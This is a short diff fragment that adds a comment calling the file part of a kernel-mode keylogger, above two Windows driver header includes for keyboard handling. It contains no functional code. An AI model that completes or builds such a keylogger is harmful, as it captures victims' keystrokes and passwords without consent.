@@ -1,3 +1,5 @@
+// Small portion of my KM keylogger with Handler ( to pass in a routine )
+
 #include <ntddk.h>
 #include <Ntddkbd.h>
 
